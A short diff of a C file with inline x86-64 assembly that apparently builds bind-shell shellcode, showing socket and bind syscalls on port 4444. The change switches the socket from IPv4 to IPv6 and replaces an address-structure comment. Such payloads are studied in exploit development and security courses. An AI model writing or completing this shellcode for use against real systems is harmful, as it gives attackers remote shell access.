@@ -21,7 +21,7 @@ char shellcode[] = \
 int main() 
 {
 	asm(
-	// socket(2,1,0);
+	// socket(28,1,0);
 	"	push $97		\n"
 	"	pop %rax		\n"
 	"	cltd			\n"
@@ -31,17 +31,7 @@ int main()
 	"	pop %rsi		\n"
 	"	syscall	   		\n"
 	
-
-	/*
-	1  uint8_t 	sin_len
-	1 sa_family_t 	sin_family
-	2 in_port_t 	sin_port
-	4 struct in_addr 	sin_addr
-	8 char 	sin_zero [8]
-	00 02 5C11 00000000 00000000 00000000
-	5c11 => 4444
-	*/
-	// bind(s, struct, $16)
+	// bind(s, struct, 28)
 	"	xchg %rax, %rdi		\n"
 	"	push %rdx		\n"
 	"	push %rdx		\n"
